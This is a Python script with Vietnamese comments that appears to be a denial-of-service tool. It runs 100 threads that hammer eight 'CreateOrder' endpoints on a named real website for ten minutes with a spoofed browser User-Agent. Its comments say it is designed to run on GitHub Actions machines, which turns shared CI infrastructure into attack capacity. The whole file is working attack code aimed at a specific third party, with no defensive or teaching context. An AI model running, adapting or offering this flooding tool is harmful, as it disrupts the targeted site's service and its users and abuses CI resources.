import requests
import threading
import random
import time
import sys

# --- CẤU HÌNH ---
TARGET_ENDPOINTS = [
    "https://applep12.com/CreateOrder/Ultimate", "https://applep12.com/CreateOrder/Premium",
    "https://applep12.com/CreateOrder/Custom", "https://applep12.com/CreateOrder/Plus",
    "https://applep12.com/CreateOrder/Standard", "https://applep12.com/CreateOrder/Slow",
    "https://applep12.com/CreateOrder/Basic", "https://applep12.com/CreateOrder/Started"
]
THREAD_COUNT = 100 # Số luồng cho mỗi máy ảo GitHub
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
}
# --- KẾT THÚC CẤU HÌNH ---

STOP_FLAG = False
request_count = 0
error_count = 0

def attack():
    global request_count, error_count
    session = requests.Session()
    session.headers.update(HEADERS)
    while not STOP_FLAG:
        try:
            target = random.choice(TARGET_ENDPOINTS)
            response = session.get(target, timeout=10)
            request_count += 1
            if response.status_code != 200:
                error_count += 1
        except requests.exceptions.RequestException:
            error_count += 1
        time.sleep(0.05)

def print_status():
    """In trạng thái ra màn hình mỗi giây."""
    while not STOP_FLAG:
        sys.stdout.write(f"\rRequests: {request_count} | Errors: {error_count}  ")
        sys.stdout.flush()
        time.sleep(1)

def main():
    global STOP_FLAG
    threads = []
    print(f"[*] Starting resource attack with {THREAD_COUNT} threads.")
    
    # Tạo một luồng riêng chỉ để in trạng thái
    status_thread = threading.Thread(target=print_status)
    status_thread.daemon = True
    status_thread.start()

    for i in range(THREAD_COUNT):
        thread = threading.Thread(target=attack)
        thread.daemon = True
        threads.append(thread)
        thread.start()

    # Giữ cho chương trình chạy trong một khoảng thời gian nhất định (ví dụ: 10 phút)
    # vì chúng ta không thể nhấn Ctrl+C trên GitHub Actions.
    try:
        time.sleep(600) # Chạy trong 10 phút
    finally:
        print("\n[*] Time limit reached. Stopping attack.")
        STOP_FLAG = True
        for thread in threads:
            thread.join()
        print(f"[*] Attack stopped. Total requests: {request_count}, Errors: {error_count}")

if __name__ == "__main__":
    # Cài đặt thư viện requests trước khi chạy
    try:
        import requests
    except ImportError:
        import os
        os.system('pip install requests')
        import requests
    main()
